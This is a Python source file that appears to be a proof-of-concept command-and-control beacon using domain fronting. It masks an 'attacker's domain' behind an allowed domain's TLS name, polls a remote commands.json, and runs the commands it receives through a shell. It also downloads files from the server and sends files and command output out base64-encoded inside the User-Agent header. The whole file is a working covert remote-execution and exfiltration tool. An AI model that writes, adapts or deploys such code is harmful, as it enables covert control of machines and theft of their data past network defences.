"""
// Copyright 2022 mas0yama
"""
import subprocess
import requests
import time
import base64


#session.get_adapter('httpss://').poolmanager.connection_pool_kw['assert_hostname'] = 'my-fake-hostname-here'

ALLOWEDEXEC = ["mkdir -p pwned_dir",
               "touch pwned_dir/pwned.sh",
               "echo 'reboot' > pwned_dir/pwned.sh",
               "ls -la",
               "!download to_download.txt",
               "!upload to_upload.txt"]

# fronting with allowed
allowed_domain = ""

# attacker's domain
disallowed_domain = ""


class Client:
    def __init__(self, allowed_domain, disallowed_domain):
        self.TIMER = 3600
        self.session = requests.Session()
        self.allowed_domain = allowed_domain
        self.disallowed_domain = disallowed_domain
        self.session.get_adapter(
            'https://').poolmanager.connection_pool_kw['assert_hostname'] = self.allowed_domain
        self.auth_token = "QWERTY=="
        self.headers = {f"Host": f"{self.disallowed_domain}",
                        'Authorization': f'Basic {self.auth_token}'}

    def timestamp(self):
        return base64.b64encode(bytes(str(time.time()), "utf-8")).decode("utf-8").replace("==", "").replace("=", "")

    def HandleResponse(self, response):

        if response['data'] == "":
            return
        for command in response['data']:
            if command not in ALLOWEDEXEC:
                return
            if command.split()[0] == "!upload":
                try:
                    print(f"Executing {command}")
                    for f in command.split()[1::]:
                        self.session.get(f"https://{allowed_domain}/{self.timestamp()}", headers={f"Host": f"{self.disallowed_domain}",
                                         'Authorization': f'Basic {self.auth_token}', 'Accept': f'File/{f}', 'User-Agent': base64.b64encode(open(f, "rb").read())})
                except Exception:
                    pass
            if command.split()[0] == "!download":
                try:
                    print(f"Executing {command}")
                    for f in command.split()[1::]:
                        with open(f, "wb") as file:
                            downloaded = self.session.get(f"https://{allowed_domain}/public_storage/{f}", headers={f"Host": f"{self.disallowed_domain}",
                                                                                                                   'Authorization': f'Basic {self.auth_token}'})
                            file.write(downloaded.content)
                except Exception:
                    pass

            try:
                print(f"Executing {command}")
                output = subprocess.Popen(
                    command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output.wait()
                message_to_send = output.communicate()[0]
                self.session.get(f"https://{allowed_domain}/{self.timestamp()}", headers={f"Host": f"{self.disallowed_domain}",
                                 'Authorization': f'Basic {self.auth_token}', 'Accept': 'Output', 'User-Agent': base64.b64encode(b"Done. Output is " + message_to_send)})
            except Exception as e:
                return

    def Run(self):
        print("Running %")
        while True:
            try:
                response = self.session.get(
                    f"https://{allowed_domain}/public_storage/commands.json", headers=self.headers).json()
                self.HandleResponse(response)
            except Exception as e:
                pass
            time.sleep(self.TIMER)

if __name__ == "__main__":
    client = Client(allowed_domain=allowed_domain,
                    disallowed_domain=disallowed_domain)
    client.Run()
